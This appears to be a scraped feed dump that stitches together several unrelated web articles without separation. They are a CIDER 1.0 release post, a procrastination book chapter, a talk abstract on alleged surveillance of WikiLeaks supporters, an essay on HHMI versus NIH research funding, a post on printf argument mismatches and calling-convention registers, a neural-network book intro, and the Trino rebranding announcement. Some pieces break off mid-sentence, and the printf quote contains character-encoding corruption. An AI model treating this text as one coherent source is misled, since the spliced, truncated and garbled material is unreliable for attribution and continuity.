    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>One of the most common causes of procrastination is the fear of failure.</p><p>Let’s imagine we have a task to do and we feel negative about it for some reason.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image19.png" referrerpolicy="no-referrer" alt="Negative emotions are like a hill"></p><p>That makes it harder to do, but we can&nbsp;<em>make it even harder</em>. Much harder. How?</p><p>We might think&nbsp;<strong>we cannot possibly make a single mistake.</strong></p><p>Maybe we adopted this attitude from our parents or our teachers in school. Whatever the reason, many of us fear failure and don’t see it as a natural part of the process.</p><p>So, failure turns from something natural, though unpleasant, into a lethal threat.&nbsp;<strong>Every simple task becomes a tightrope walk over a deadly chasm.</strong></p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image27.png" referrerpolicy="no-referrer" alt="Fear of failure is like a chasm"></p><p>No wonder the fear of failure is so paralyzing. When we perceive every mistake as a possible death (or sacking, or dropping out, or a proposal rejection), it raises our stress levels and we try to relieve them by procrastinating.</p><p>We make ourselves into a tightrope walker.</p><h2><strong>What a tightrope walker believes</strong></h2><h3><strong>If I fail, I’m worthless and destined to die</strong></h3><p><em>If this business fails, I’m clearly someone who can’t have any kind of business.</em></p><p><em>If this book doesn’t hit the bestseller list, I’m clearly not a good writer.</em></p><p><em>If I don’t pass this subject, I’m clearly never going to be good at it.</em></p><p>Some of us have a tendency to view failure as a fatal verdict.</p><p><em>If I fail, I’m clearly not good enough.</em></p><p>When we fail (which we inevitably will at some point), we can take it as the end. We get crushed.</p><p><em>Well, better do something else.</em></p><p>The thing is, everyone fails. We lose money, we lose partners, projects fail… but not all of us react in the same way.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image43.png" referrerpolicy="no-referrer" alt="Different reactions to failure"></p><p><strong>Most of the time, failure isn’t a fall off a cliff.</strong></p><p>We humans have an uncanny ability to recover from all sorts of mistakes,&nbsp;<em>if we allow ourselves to.</em></p><p>It’s foolish to expect that we'll be good at everything we try and won’t fail ever.</p><p>Let’s update our view of failure.</p><h3><strong>When I fail, I’ll get back on my feet</strong></h3><p>Everything doesn’t depend on one single performance most of the time.</p><p><strong>When you look at the lives of successful people, we see that they failed many, many times.</strong></p><p>Legendary investor Ray Dalio at one point lost all his money. Entrepreneur Elon Musk at one point didn’t have enough money for rent. Apple founder Steve Jobs was at one point kicked out of the very company he started!</p><p>If these people took those failures as fatal diagnoses of their worthlessness, neither one of them would build billion dollar companies.</p><p>They learned from their failures and got back into a ring.</p><p><strong>Failures big and small happen all the time. The important part is recovering, learning from them (so then they don’t repeat) and taking them in stride.</strong></p><h3><strong>Performance = my self-worth</strong></h3><p>As with perfectionists, people who fear failure identify with their work.</p><p>New project? If it doesn’t pan out, I’m a failure.</p><p>Test in school? If I get an F, I’m an idiot.</p><p>If I’m not first, I’m below average.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image55.png" referrerpolicy="no-referrer" alt="Self-worth tied to an outcome"></p><p>Failure is not a fatal diagnosis. One F doesn’t make someone an idiot, it simply points to their current level of mastery of the subject. And that level can improve with effort.</p><p><strong>Failure is not a diagnosis of worthlessness.</strong></p><h3><strong>Performance = current level of ability, I can always improve</strong></h3><p>You’re at a competition and you lose.</p><p>You’re taking a test and you hand in an empty test with just your name.</p><p>You make a presentation on the wrong topic.</p><p>Happens to everyone. You can’t win every contest and succeed with every project for the rest of your life.</p><p>So why not take a particular performance (presentation, project, test,...) as just one performance at one point in time?</p><p>Every product of our effort is a clue whether we’re going in the right direction or not.</p><p>Bad performance? Okay, what do we have to change? How can I get better at this?</p><p>Good performance? Awesome, let’s go full steam ahead.</p><h2><strong>Mindset shifts</strong></h2><p>To summarize, here are the 2 main mindset shifts to take away:</p><ul><li>When I fail, I take it as a fatal diagnosis of my worthlessness.<br>→<br><strong>When I fail, I’ll reflect on how I can improve.</strong></li><li>My performance = my self-worth.<br>→<br><strong>My performance = my current level of ability.</strong></li></ul><p>Now let’s take a look at some tools and exercises that can help us manage and reduce the fear of failure.</p><div><div><p>Hi there! This is a free sample chapter from our book.</p><p>If you want to get a whole comprehensive guide about procrastination and learn about each fear deeply,&nbsp;<a href="https://www.deprocrastination.co/guide">check out our handbook.</a></p><p>We put hundreds of hours of research into it, so you don’t have to. And also we keep updating it often to give you the best, most concrete strategies for dealing with procrastination.</p></div></div><h2><strong>1. Put the fear of failure into perspective</strong></h2><h3><strong>How to overcome fear: Understand your options</strong></h3><p>We sometimes think that our situation is one big dead-end.</p><p>We might have a job we depend on and be unable to do what we want because it would mean losing it.</p><p>Or we might have one big project we’re working on that would sink us deep into debt if it didn’t pan out.</p><p>The problem with scenarios like this is that they put tremendous pressure on us.</p><p>And we try to ease it off by procrastinating.</p><p>If we have one thing to do and its failure would mean the end of the world, every step we’re unsure of becomes a tightrope walk.</p><p>One email or a blank page of a document turns into the possibility of apocalypse.</p><p>Who wouldn’t be stressed in a situation like that?</p><p>What if we could ease the pressure a little more?</p><h2><strong>Use the fear of regret</strong></h2><p><img src="https://www.deprocrastination.co/assets/book_images_2/image13.png" referrerpolicy="no-referrer" alt="Fear of regret outweighing fear of failure"></p><p>Elon Musk estimated the odds of his success with SpaceX to be about 40%.</p><p>Jeff Bezos thought Amazon had about 30 % chance of succeeding.</p><p>How then could they make the decision to start? How come they didn't worry and dwell on those odds? How could Musk invest millions of his own money into SpaceX?</p><p><strong>Because it was worth it.</strong></p><p>Fear is only one side of the equation. Depression, regret, sadness,.. those are on the other side.</p><p>For Musk, the other side of the equation was profound sadness. If humanity couldn't go to Mars, that would be depressing to him on a fundamental level.</p><p>For Bezos, it was regret that helped him overcome his fear. He read that the Internet was growing 2300 % a year. That seemed like a great opportunity. But he already had a great job in New York, how could he leave it and start from scratch something risky?</p><h2><strong>2. Set yourself up to learn if you fail</strong></h2><p>As we mentioned before,&nbsp;<strong>failure is most often not fatal, especially when it comes to business or creative endeavors.</strong></p><p>Yes, you might give a bad presentation. You might paint a lousy portrait. You might cause someone discomfort because your app didn't work. That happens. It's not the end of the world.</p><p><strong>Failure doesn't feel great, but you'll survive. You'll get back up and try again.</strong></p><h3><strong>"It might not work"</strong></h3><p>Seth Godin, a best-selling author and master marketer, often repeats this phrase:</p><p><em>"Do things that might not work."</em></p><p>Why does he do that?</p><p><strong>This phrase acknowledges that in creative work you might fail, you might disappoint someone, you might feel bad, but you should still try. You should still try to innovate, to push yourself, to create.</strong></p><p>So there's always some risk of failure, but a) the failure is most often not fatal and b) you can reduce the risk of failure.</p><h2><strong>Summary:<br>Failure is not fatal, it’s a stepping stone</strong></h2><p>Failures, mishaps, personal embarrassments,... they aren’t the end of the world even though it may seem like it at the moment.</p><p><strong>Failure in the right direction is a good thing.</strong></p><p>Exercises like negative visualization or plan B and Z help us prepare for potential catastrophes and also dispel unnecessary fear.</p><p>When you find yourself procrastinating because of the fear of failure:</p><ol><li><p>Put the fear of failure into perspective</p><ol><li><strong>Negative visualization</strong><br>Think about the worst-case scenario. Imagine it vividly. What's really the worst case</li><li><strong>Plan B and Z</strong><br>Think what your plan B would be if you failed with A. How could you make a living then? And if sh*t hits the fan, create a contingency plan (plan Z). What would you do if everything fails?</li><li><strong>Regret minimization framework</strong><br>Ask yourself:<br><em>When I'm 80 and looking back on my life, would I regret not taking this opportunity?</em>&nbsp;<br>Use your fear of regretting something for the rest of your life to overcome the fear of failure and take the leap.</li><li><strong>Win-win</strong><br>Ask yourself:<br><em>How would I win even if I failed?</em></li></ol></li><li><p>Set yourself up to learn if you fail</p><ol><li><strong>Reduce risk by experimenting</strong><br>Try things in private, free of judgment. Test your ideas.</li><li><strong>Reflect on past failures</strong><br>Remember Ray Dalio's mantra:<br><em>Pain + Reflection = Progress</em></li></ol></li></ol><p>These 6 tools will help you overcome your fear of failure and stop procrastinating. We hope you find them useful.</p></article></div>]]>

<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So there's this paper, <em>Incentives and Creativity: Evidence from the academic life sciences</em> (Azoulay, Graff Zivin, Manso <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1756-2171.2011.00140.x">2011</a>) that shows that Howard Hughes Medical Institute (HHMI) investigators (who are funded for a longer term and in a more open ended way) outperform those of the National Institutes of Health (NIH) that have shorter review cycles and more concrete grant proposals. This is seen as a vindication of the "<a href="https://twitter.com/pierre_azoulay/status/1141118605985308674">fund people, not projects</a>" paradigm. However, the effect sample reported is <em>huge</em> , perhaps too good to be true, and the extent to which this model can scale is debatable, as Azoulay himself also <a href="https://twitter.com/pierre_azoulay/status/1318578977527668736">says</a> that <em>it is not clear how well this model can scale. HHMI is very much focused on a narrow elite</em>.</p>
<blockquote>
<p>Similarly, while science generates much of our prosperity, scientists and researchers themselves do not sufficiently obsess over how it should be organized. In a recent paper, Pierre Azoulay and co-authors <a href="https://www.nber.org/papers/w15466">concluded</a> that <strong>Howard Hughes Medical Institute’s long-term grants to high-potential scientists made those scientists 96 percent more likely to produce breakthrough work</strong>. If this finding is borne out, it suggests that present funding mechanisms are likely to be far from optimal, in part because they do not focus enough on research autonomy and risk taking. (<a href="https://www.theatlantic.com/science/archive/2019/07/we-need-new-science-progress/594946/">We need a new science of progress</a>)</p>
</blockquote>
<p>
[1]. There are other NIH similar grants like the MERIT award or the Outstanding Investigator Award (R35)
</p>
<p>NIH has their own HHMI-style throw-money-at-the-best program, the Director's Pioneer award (DP1)<sup><a href="#sidenote-1">1</a></sup> which also seems to produce <a href="https://commonfund.nih.gov/sites/default/files/HRHR%20PA%20FY%202004-2006%20Outcome%20Evaluation.pdf">great</a> <a href="https://dpcpsi.nih.gov/sites/default/files/CoC-051413-Pioneer-Award-Program-DP1.pdf">results</a>. <a href="https://commonfund.nih.gov/pioneer">DP1</a> grants are similar to the HHMI Investigators program (700k per year vs ~1M at HHMI) and as selective (11 pioneers per year vs 20 for HHMI). They are not as long-lasting as the HHMI ones however in that they last for 5 years while HHMIs enjoy a theoretical 7 and a practical 15 years of funding. </p>
<p>Both have been lauded as exemplary programs that <em>cause more good science to happen that otherwise would not</em>.</p>
<p>So this seems like an important "huge if true" fact. Even if, as Azoulay suspects, this model cannot scale, it is reasonable to think that the scientific elite that would benefit from this class of funding is comprised of more than the current 250 HHMI investigators and 50 or so DP1 awardees.</p>
<p>So with this setup, let's look at first the general question (people, not projects) and then the specifics of NIH and the HHMI once we have a framework to assess them.</p>
<h2 id="fund-people-not-projects">Fund People, not projects</h2>
<p>The usual way grants are allocated is a process whereby a scientist says they want to do specific piece of work X and then they get money to do that. In <a href="https://guzey.com/how-life-sciences-actually-work/">practice</a>, researchers have already done part of what they say they will do (And use that data to support the application), and will use part of the funds to work on other things they may want to work on so they can do as they please with <em>part</em> of their time and money. But for the most part, they are working on what they say they are working on. R01 grants, the bulk of NIH's funding, run for 5 years (And this has gone <a href="https://nexus.od.nih.gov/all/2013/11/07/how-long-is-an-r01/">up</a> over time), not too dissimilar, at first glance, to the HHMI's 7.</p>
<p>With DP1 and HHMI, researchers do not submit a grant proposal for something specific they want to do, they submit their resume and a <strong>broad summary of what they are going to be working on</strong>. This research program (3k words) is shorter than a usual Nintil blogpost, and substantially shorter than one of the sample R01 grant applications from the NIAD's <a href="https://www.niaid.nih.gov/sites/default/files/1-R01-AI121500-01A1_Gordon_Application.pdf">website</a> which are over 5x longer (excluding references and CVs). </p>
<p>
[2]. Azoulay et al. 2011 states that 'Moreover, HHMI investigators appear to share the perception that their first appointment review is rather lax, with reviewers more interested in making sure that they have taken on new projects with uncertain payoffs, rather than insisting on achievements. Below, we validate this perception by showing that the second review is much more sensitive to performance than the first.'
</p>
<p>Both are similar in that they can be renewed; if one wants to work on a 20 year project, in theory one can roll the <a href="https://www.niaid.nih.gov/grants-contracts/apply-renewal">same</a> R01 four times, with the <a href="https://nexus.od.nih.gov/all/2016/02/16/are-attempts-at-renewal-successful/">likelihood</a> of being renewed starting at 30%. HHMI is more forgiving once one is in and in the event one is out: it provides <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">two years of phase-out</a> if a renewal is not successful and the renewal rate is &gt;80% anyway, leading to a median of 16 years of <a href="https://twitter.com/JSheltzer/status/1208442925249630209">support</a><sup><a href="#sidenote-2">2</a></sup>. Thus HHMI investigators can expect to be funded for longer, and because if they lose funding they don't have to be immediately looking for support, that should also help keep their eyes in the long term. This is not to say that HHMI investigators do not spend time applying for grants, you can search <a href="https://projectreporter.nih.gov/reporter.cfm">here</a> for example <a href="https://en.wikipedia.org/wiki/Feng_Zhang">Feng Zhang</a> (HHMI since 2018) and see that he got a DP1 in 2020 as well as R01s in 2020 and 2019. Even <a href="https://en.wikipedia.org/wiki/David_J._Anderson">David J. Anderson</a> (HHMI since 1989) can be seen applying for R01s in the same site. This is because the HHMI award, generous as it is, covers the investigator's salary, some research budget, special expenses for expensive equipment, but not every expense, and not the hiring of additional lab members.</p>
<p>There are other differences, HHMI <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">requires</a> researchers to spend 75% of their time doing research, whereas in R01s there is no such limit. DP1s are required to work half of their time on grant-related research.</p>
<p>This brief discussion is just to highlight that the "fund people, not projects" approach, even when looked at by using their usual life sciencesexemplars, is not as clear cut as it may seem. It may be more useful to consider two extreme idealized approaches instead:</p>
<ul>
<li>Fund projects: A scientist proposes to do a specific, well defined project. There is an expected deliverable and there may be milestones involved that have to be met. Rather then being open ended and highly uncertain, it is roughly known to be achievable. The project should be ended if it's not meeting its goals.</li>
<li>Fund people: A scientist is funded generously and have all their requirements for assistants and equipment met without paperwork or further reviews. They have zero accountability, and what they decide to research or publish has no bearing on the continuation of funding. In effect they have life tenure. They don't perish if they don't publish.</li>
</ul>
<p>It's clear that there are advantages and disadvantages to both approaches; they are the explore/exploit tradeoff with another name. The first one is similar to the <a href="https://www.dayoneproject.org/post/focused-research-organizations-to-accelerate-science-technology-and-medicine">Focused Research Organization</a> concept.</p>
<p>The second one sounds like tenure. But modern day tenure is not generally like this. Scientists are <a href="https://academia.stackexchange.com/questions/37986/is-it-possible-to-survive-in-university-academia-without-applying-for-grants">expected to continue to apply</a> for grants and bring money to the university (The university gets a cut), as well as to grow their lab; in turn as they now have a lab they have some obligation to their students, who do need to publish in high impact journals in order to get ahead in academia. Tenure pays just the salay (and 9 months of it in the case of US tenure, as the other 3 are expected to be covered with grants). It does not cover the cost of any materials employed during the course of research, or the salaries of research assistants (Those also have to come from grants). </p>
<p>Donald Braben <a href="https://nintil.com/review-scientific-freedom">points out</a> that before 1970 (or so)</p>
<blockquote>
<p>tenured academics with an individual turn of mind could usually dig out modest sources of funding to tackle any problem that interested them without first having to commit themselves in writing. Afterward, unconditional sources of funds would become increasingly diffi cult to find. Today, they are virtually nonexistent.</p>
<p>The way forward for ambitious young researchers was once clear, therefore. All they had to do was to acquire the necessary qualifications, and then to find a tenured appointment. To say the least, that was not easy, but not substantially more difficult than it would be today. However, having served their apprenticeship, they were free. They may have had to overcome the inevitable peer pressure if their plans were controversial, but their peers did not have power of veto— see Poster 1 .Written applications were necessary if expensive equipment or large teams were required, but tenured researchers with modest needs would meet few obstacles. </p>
</blockquote>
<p>This still sounds like modern day tenure! What has changed is that <em>if</em> more expensive equipment is now required (And this is most likely true in the life sciences than in theoretical physics) and that in turn requires grants, then academics now have that additional potential veto in a way that the cheaper experiments of the past did not have. And Braben can't argue that the new system selects for people that are good at getting grants. In the quote above he concedes that getting tenure was as hard back then; and plausibly to get tenure you needed the same things you do today.</p>
<p>The ones that come close to the "fund people" approach are not HHMI investigators, or the pre-1970 scientific community; those would be the self-funded <a href="https://en.wikipedia.org/wiki/Independent_scientist">independent scientists</a> that were wealthy enough to be able to do anything they wanted. Alfred Loomis' story in particular, how he managed to have the best equipped lab in the US, paid out of his Wall Street profits, seems the closest to the platonic form of the fund people approach.</p>
<h2 id="fund-people-not-metrics">Fund people, not metrics?</h2>
<p>Another distinction to be made here beyond people vs projects is <em>how</em> people or projects are selected. One can use impersonal metrics or one can get more personal and, eschew all bureaucracy and process and go full <a href="https://twitter.com/matthewclifford/status/1326479506983579648">nepotistic</a>. Though not intrinsically tied to "fund people", it is true that those approaches have historically been more linked to a personal approach. Ioannidis (<a href="https://www.nature.com/articles/477529a">2011</a>) discusses various "fund people" approaches which include using mechanisms like lotteries or just funding everyone. This is one of the two missing sectors of the 2x2 quadrant (In red, missing):</p>

<p>In the HHMI process, a scientist get personally interviewed in the later stages of being funded. For R01s, there is a committee (a study section) that one will never see or meet. The Rockefeller foundation (post WWII) took it to an even more extreme …</p></div></div>

	<p><small>December 28, 2020</small></p>
</div><div><p>In <a href="https://randomascii.wordpress.com/2020/08/30/the-easy-ones-three-bugs-hiding-in-the-open/">The Easy Ones â€“ Three Bugs Hiding in the Open</a>,
Bruce Dawson gave us a little C puzzle in passing:</p>

<blockquote><p>The <a href="https://en.wikipedia.org/wiki/Stdarg.h">variable arguments</a> in
printf formatting means that it is easy to get type mismatches. The
practical results vary considerably:</p>

<ol><li>printf(â€œ0x%08lxâ€�, p); // Printing a pointer as an int â€“ truncation or worse on 64-bit </li>
<li>printf(â€œ%d, %fâ€�, f, i); // Swapping float and int â€“ could print nonsense, or might actually work (!) </li>
<li>printf(â€œ%s %dâ€�, i, s); // Swapping the order of string and int â€“ will probably crash</li>
</ol>

<p>[...] (aside: understanding why #2 often
prints the desired result is a good <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a> puzzle)</p>
</blockquote>

<p>I had to think about this for a bit, and then I realized why and
how it can work (and why similar integer versus float argument
confusion can also work for other functions, even ones with fixed
argument lists). What it comes down to is that in some <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a>s,
arguments are passed in registers (at least early arguments, before
you run out of registers), and <strong>floating point arguments are passed
in different registers than integers (and pointers)</strong>.  This is
true even for functions that take variable arguments and will walk
through them using stdarg macros (or at least it can be, depending
on the ABI).</p>

<p>Because floating point and non floating point arguments are passed
in different sets of registers, what matters isn't the total order
of arguments but the order of floating point or non-fp arguments.
So here, regardless of where '%f' is in the printf format, it always
causes printf() to get the first floating point argument, which can
never be confused with an integer argument. Similarly, the first
'%d' causes printf() to look for the second non-fp argument,
regardless of where it was in the argument order; it could be at
the end of several floating point arguments and still work.</p>

<p>(The '%d' makes printf() look for the second non-fp argument because
the first one was the format string. In an ABI that passed pointers
in a separate place than integers, it would still work out, since now
the first '%d' would be looking for the first integer argument.)</p>

<p>Using the excellent services of godbolt.org, we can see this in
action on 64-bit x86 in <a href="https://godbolt.org/z/hYz9Gn">a very small example</a> (I used a very small example and a
decent optimization level to get clear, minimal assembly code). The
floating point argument is passed in <code>xmm0</code>, while the format string
and the integer argument are passed in <code>edi</code> and <code>esi</code> respectively
(I don't know what <code>eax</code> is doing, but it probably has something
to do with the ABI). A similar thing happens on 64-bit ARM v8 (aka
Aarch64), as we can also see on godbolt with <a href="https://godbolt.org/z/jrxz96">the same example on
Aarch64</a>.</p>

<p>(Based on <a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">this page</a>,
the Aarch64 <code>x0</code> and <code>w1</code> are in the same set of registers. Apparently
<code>d0</code> is a 64-bit version of the first floating point register, from
<a href="https://armkeil.blob.core.windows.net/developer/Files/pdf/graphics-and-multimedia/ARMv8_InstructionSetOverview.pdf">here</a>
[pdf]. I wound up looking up all of this to be sure I understood
what was going on in the Aarch64 call, so I might as well write it
down here.)</p>

<p>Since pointers and integers are normally passed in the same set of
registers (at least on 64-bit x86 and Aarch64), we can also see why
the third example is very likely to fail. Since the same set of
registers is used for both argument types, it's possible to use an
integer argument as a pointer argument, with a segmentation fault
as the likely result. Similarly, we can predict that '<code>printf("%s
%f", f, s);</code>' might well work.</p>

<p>PS: This confusion can happen in any language that follows the C
ABI on a platform with this sort of split usage of registers (although
many languages may prevent this sort of argument type confusion).
Not all languages do; famously, Go currently passes all arguments
on the stack (as of Go 1.15 and soon Go 1.16).</p>

            <p>In this mini-book, you will(hopefully) learn about different neural network structures. By the end of the book,
                I hope you also will have a solid conceptual understanding of how neural networks function.</p><p>I will briefly go through some necessary formulas and equations, but will mainly
                stick to broad definitions that are comprehendible to even middle school students(I’ll try!). Some topics are well
                beyond those taught in middle school, so you may want to look at more thorough and step-by-step walkthroughs on the
                topics on platforms like <a rel="noopener" href="https://khanacademy.org/" target="_blank">Khan Academy</a>.
                As you go through this book, you will also encounter several different projects and real-world problems that I will
                walk you through and solve. I highly recommend you take a try at solving them beforehand! Solutions that I give may
                not be the best and most state-of-the-art, so you can also try and tweak it a bit to make it better! I will try to
                add some optimizations to the code to make it faster and more efficient and give you a summary of what state-of-the-art
                methods data scientists now use. All code in this book is either pseudocode or written in Java, so you should be able to
                roughly interpret it if you have learned any C-like programming languages! You don’t need to learn one right away to
                continue reading either… I provide detailed explanations of each line of code. You can also find it all on
                <a rel="noopener" href="https://github.com/JC-ProgJava/Building-Neural-Networks-From-Scratch" target="_blank">GitHub</a> (with this book).</p>

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>

  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

